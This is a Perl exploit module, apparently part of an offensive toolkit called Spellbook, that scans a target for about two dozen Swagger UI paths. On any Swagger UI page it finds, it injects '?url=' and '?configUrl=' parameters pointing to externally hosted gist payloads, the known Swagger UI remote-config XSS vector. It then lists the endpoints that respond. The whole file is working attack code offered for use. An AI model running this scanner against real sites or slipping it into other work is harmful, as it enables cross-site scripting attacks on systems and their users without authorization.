package Spellbook::Exploit::Swagger_XSS {
    use strict;
    use warnings;
    use Spellbook::Core::UserAgent;

    our $VERSION = '0.0.1';

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, @result);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            "h|help"     => \$help,
            "t|target=s" => \$target
        );

        if ($target) {
            if ($target !~ /^http(s)?:\/\//x) {
                $target = "https://$target";
            }

            $target =~ s/\/$//x;
            my $useragent = Spellbook::Core::UserAgent -> new();

            my @paths = (
                "/swagger", "/swagger-ui", "/swagger.json", "/v2/api-docs", "/api-docs", "/api/swagger", "/api/swagger-ui", "/api/swagger.json",
                "/api/v2/api-docs", "/api/api-docs", "/docs/swagger", "/docs/swagger-ui", "/docs/swagger.json", "/docs/v2/api-docs", 
                "/docs/api-docs", "/swagger-ui.html", "/api/swagger-ui.html", "/api/v1/swagger-ui.html", "/v1/swagger-ui.html",
                "/api/v2/swagger-ui.html", "/v2/swagger-ui.html", "/api/v3/swagger-ui.html", "/v3/swagger-ui.html"
            );

            foreach my $path (@paths) {
                my $path_response = $useragent -> get("$target$path");

                if ($path_response -> code() == 200) {
                    if ($path_response -> content() =~ /<title>(.*)<\/title>/x) {
                        my $title = $1;

                        if ($title =~ /Swagger UI/x) {
                            my @payloads = (
                                "?url=https://gist.githubusercontent.com/htrgouvea/df8a1a495c96c9942adc003884bc6b30/raw/92202a78d99d6c284b675ed34cf882895d75dfb4/payload-swagger-ui.yml",
                                "?configUrl=https://gist.githubusercontent.com/htrgouvea/86e17124610e7550295533e9d7bac571/raw/cf690c6862d38e02a081a9d580510ba8fff28bef/payload-swagger-ui.json"
                            );

                            foreach my $payload (@payloads) {
                                my $endpoint = $target . $path . $payload;
                                my $endpoint_response = $useragent -> get($endpoint);

                                if ($endpoint_response -> code() == 200) {
                                    push @result, $endpoint;
                                }
                            }
                        }
                    }
                }
            }

            return @result;
        }

        if ($help) {
            return "
                \rExploit::Swagger_XSS
                \r=====================
                \r-h, --help     See this menu
                \r-t, --target   Set a target\n\n";
        }
        
        return 0;
    }
}

1;
